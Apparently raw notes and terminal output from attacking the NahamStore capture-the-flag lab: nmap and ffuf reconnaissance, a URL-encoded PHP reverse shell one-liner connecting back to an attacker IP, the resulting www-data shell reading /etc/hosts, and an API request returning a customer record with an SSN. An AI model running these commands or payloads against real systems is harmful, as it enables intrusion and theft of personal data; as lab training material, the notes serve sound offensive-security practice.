──(kali㉿kali)-[~/Downloads/NahamStore]
└─$ sudo nmap -sS --min-rate 5000 -p- --open -n -Pn 10.201.98.118 -oN scan.txt
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-01 09:51 EDT
Nmap scan report for 10.201.98.118
Host is up (0.27s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 14.92 seconds
                                                                                                                        
┌──(kali㉿kali)-[~/Downloads/NahamStore]
└─$ grep '^[0-9]' scan.txt | cut -d '/' -f1 | sort -u | xargs | tr ' ' ','
22,80,8000
                                                                                                                        
┌──(kali㉿kali)-[~/Downloads/NahamStore]
└─$ nmap -22,80,8000 -sV -sC -Pn -vvv -n 10.201.98.118 -oN fullScan.txt 
nmap: unrecognized option '-22,80,8000'
See the output of nmap -h for a summary of options.
                                                                                                                        
┌──(kali㉿kali)-[~/Downloads/NahamStore]
└─$ nmap -p22,80,8000 -sV -sC -Pn -vvv -n 10.201.98.118 -oN fullScan.txt 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-01 09:52 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:52
Completed NSE at 09:52, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:52
Completed NSE at 09:52, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:52
Completed NSE at 09:52, 0.00s elapsed
Initiating Connect Scan at 09:52
Scanning 10.201.98.118 [3 ports]
Discovered open port 22/tcp on 10.201.98.118
Discovered open port 80/tcp on 10.201.98.118
Discovered open port 8000/tcp on 10.201.98.118
Completed Connect Scan at 09:52, 0.26s elapsed (3 total ports)
Initiating Service scan at 09:52
Scanning 3 services on 10.201.98.118
Completed Service scan at 09:52, 11.99s elapsed (3 services on 1 host)
NSE: Script scanning 10.201.98.118.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:52
Completed NSE at 09:52, 7.58s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:52
Completed NSE at 09:52, 1.05s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:52
Completed NSE at 09:52, 0.00s elapsed
Nmap scan report for 10.201.98.118
Host is up, received user-set (0.26s latency).
Scanned at 2025-08-01 09:52:11 EDT for 21s

PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 84:6e:52:ca:db:9e:df:0a:ae:b5:70:3d:07:d6:91:78 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDk0dfNL0GNTinnjUpwRlY3LsS7cLO2jAp3QRvFXOB+s+bPPk+m4duQ95Z6qagERl/ovdPsSJTdiPXy2Qpf+aZI4ba2DvFWfvFzfh9Jrx7rvzrOj0i0kUUwot9WmxhuoDfvTT3S6LmuFw7SAXVTADLnQIJ4k8URm5wQjpj86u7IdCEsIc126krLk2Nb7A3qoWaI+KJw0UHOR6/dhjD72Xl0ttvsEHq8LPfdEhPQQyefozVtOJ50I1Tc3cNVsz/wLnlLTaVui2oOXd/P9/4hIDiIeOI0bSgvrTToyjjTKH8CDet8cmzQDqpII6JCvmYhpqcT5nR+pf0QmytlUJqXaC6T
|   256 1a:1d:db:ca:99:8a:64:b1:8b:10:df:a9:39:d5:5c:d3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC/YPu9Zsy/Gmgz+aLeoHKA1L5FO8MqiyEaalrkDetgQr/XoRMvsIeNkArvIPMDUL2otZ3F57VBMKfgydtBcOIA=
|   256 f6:36:16:b7:66:8e:7b:35:09:07:cb:90:c9:84:63:38 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPAicOmkn8r1FCga8kLxn9QC7NdeGg0bttFiaaj11qec
80/tcp   open  http    syn-ack nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: NahamStore - Setup Your Hosts File
|_http-favicon: Unknown favicon MD5: 8880CB0A929B848F386E68C5E3FA1676
| http-methods: 
|_  Supported Methods: GET HEAD POST
8000/tcp open  http    syn-ack nginx 1.18.0 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Supported Methods: GET HEAD POST
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:52
Completed NSE at 09:52, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:52
Completed NSE at 09:52, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:52
Completed NSE at 09:52, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.41 seconds
                                                                                                                        
┌──(kali㉿kali)-[~/Downloads/NahamStore]
└─$ 












# DOMINIOS 

ffuf -u http://nahamstore.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "HOST: FUZZ.nahamstore.thm" -mc all -fw 125


shop                    [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 258ms]
marketing               [Status: 200, Size: 2025, Words: 692, Lines: 42, Duration: 272ms]
stock 

shop.nahamstore.thm marketing.nahamstore.thm stock.nahamstore.thm nahamstore-2020.nahamstore.thm nahamstore-2020-dev.nahamstore.thm





 `php%20-r%20%27%24sock%3Dfsockopen%28%2210.8.163.249%22%2C4444%29%3Bexec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27`





 connect to [10.8.163.249] from (UNKNOWN) [10.201.98.118] 38374
ls
css
index.php
js
robots.txt
uploads
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
pwd
/var/www/html/public
cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.17.0.2      2431fe29a4b0
127.0.0.1       nahamstore.thm
127.0.0.1       www.nahamstore.thm
172.17.0.1      stock.nahamstore.thm
172.17.0.1      marketing.nahamstore.thm
172.17.0.1      shop.nahamstore.thm
172.17.0.1      nahamstore-2020.nahamstore.thm
172.17.0.1      nahamstore-2020-dev.nahamstore.thm
10.131.104.72   internal-api.nahamstore.thm





 dirsearch -u http://nahamstore-2020-dev.nahamstore.thm -r



gobuster dir --url http://nahamstore-2020-dev.nahamstore.thm -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt









http://nahamstore-2020-dev.nahamstore.thm/api/customers/?customer_id=2



{"id":2,"name":"Jimmy Jones","email":"jd.jones1997@yahoo.com","tel":"501-392-5473","ssn":"521-61-6392"}